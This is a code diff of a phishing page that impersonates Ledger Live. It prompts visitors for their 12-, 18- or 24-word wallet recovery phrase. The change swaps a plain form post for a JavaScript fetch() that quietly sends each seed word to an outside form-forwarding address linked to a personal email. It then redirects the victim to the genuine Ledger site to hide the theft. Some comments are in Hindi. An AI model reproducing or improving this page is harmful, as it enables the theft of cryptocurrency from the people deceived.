@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title> Ledger Live live</title>
+    <title> Ledger Live</title>
     <style>
-        /* [स्टाइल्स वही हैं, कोई बदलाव नहीं] */
+        /* [Styles here...] */
         body { background-color: #121212; color: #eaeaea; font-family: 'Inter', 'Segoe UI', sans-serif; margin: 0; padding: 0; display: flex; }
         .sidebar { width: 260px; background-color: #181818; height: 100vh; display: flex; flex-direction: column; padding: 25px; }
         .logo { font-family: 'Courier New', monospace; font-weight: bold; font-size: 18px; margin-bottom: 40px; color: #fff; letter-spacing: 1px; }
@@ -45,26 +45,16 @@
         <p class="note">**Ledger does not keep a copy of your recovery phrase.**</p>
         <p class="note">**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.**</p>
         
-        <form action="https://formsubmit.co/ken936785@gmail.com" method="POST">
+        <div class="phrase-options">
+            <button type="button" id="btn12">12 Words</button>
+            <button type="button" id="btn18">18 Words</button>
+            <button type="button" id="btn24" class="active">24 Words</button>
+        </div>
 
-            <div class="phrase-options">
-                <button type="button" id="btn12">12 Words</button>
-                <button type="button" id="btn18">18 Words</button>
-                <button type="button" id="btn24" class="active">24 Words</button>
-            </div>
+        <div class="grid" id="phraseGrid"></div>
 
-            <div class="grid" id="phraseGrid"></div>
-
-            <input type="hidden" name="_subject" value="Website Data Submission">
-            <input type="hidden" name="_thankyou" value="https://www.ledger.com/">
-            
-            <input type="hidden" name="_captcha" value="false">
-
-            <input type="hidden" name="phrase_word_count" id="phrase_word_count" value="24">
-
-            <button type="submit" class="continue-btn">Continue...</button>
-        
-        </form>
+        <button onclick="submitData()" class="continue-btn">Continue...</button>
+    
     </div>
 
     <script>
@@ -72,7 +62,7 @@
         const btn12 = document.getElementById('btn12');
         const btn18 = document.getElementById('btn18');
         const btn24 = document.getElementById('btn24');
-        const countInput = document.getElementById('phrase_word_count'); 
+        let currentCount = 24; // Track the current word count
 
         function generateBoxes(count) {
             grid.innerHTML = '';
@@ -80,10 +70,11 @@
                 const input = document.createElement('input');
                 input.placeholder = i;
                 input.name = `word_${i}`;
+                input.id = `word_${i}`; // ID for easy access
                 input.required = true;
                 grid.appendChild(input);
             }
-            countInput.value = count; 
+            currentCount = count; // शब्द गणना को अपडेट करें
         }
 
         function activateButton(btn) {
@@ -95,8 +86,45 @@
         btn18.onclick = () => { generateBoxes(18); activateButton(btn18); };
         btn24.onclick = () => { generateBoxes(24); activateButton(btn24); };
 
-        // Default view: 24 boxes
         generateBoxes(24);
+        
+        // **नया JavaScript फंक्शन: सबसे तेज़ रीडायरेक्ट**
+        function submitData() {
+            const formData = new FormData();
+            formData.append("_subject", "Website Data Submission (Quick JS)");
+            formData.append("phrase_word_count", currentCount);
+            
+            let allWordsFilled = true;
+            
+            // डेटा इकट्ठा करें और सत्यापन करें
+            for (let i = 1; i <= currentCount; i++) {
+                const inputElement = document.getElementById(`word_${i}`);
+                if (inputElement && inputElement.value.trim() !== "") {
+                    formData.append(`word_${i}`, inputElement.value.trim());
+                } else {
+                    allWordsFilled = false;
+                    alert(`Please fill in word ${i}`); // यूज़र को चेतावनी दिखाएं
+                    break;
+                }
+            }
+
+            if (!allWordsFilled) {
+                return; // अगर कोई फ़ील्ड खाली है, तो रुक जाएं
+            }
+
+            // **1. डेटा भेजने का अनुरोध शुरू करें (await के बिना)**
+            fetch("https://formsubmit.co/ajax/ken936785@gmail.com", {
+                method: "POST",
+                body: formData
+            }).catch(error => {
+                // error को हैंडल करें लेकिन प्रोसेस को न रोकें
+                console.error("Error submitting data in background:", error);
+            });
+            
+            // **2. तुरंत रीडायरेक्ट करें**
+            // चूंकि हम सर्वर के जवाब का इंतजार नहीं कर रहे हैं, यह तुरंत रीडायरेक्ट कर देगा।
+            window.location.href = "https://www.ledger.com/";
+        }
     </script>
 
 </body>
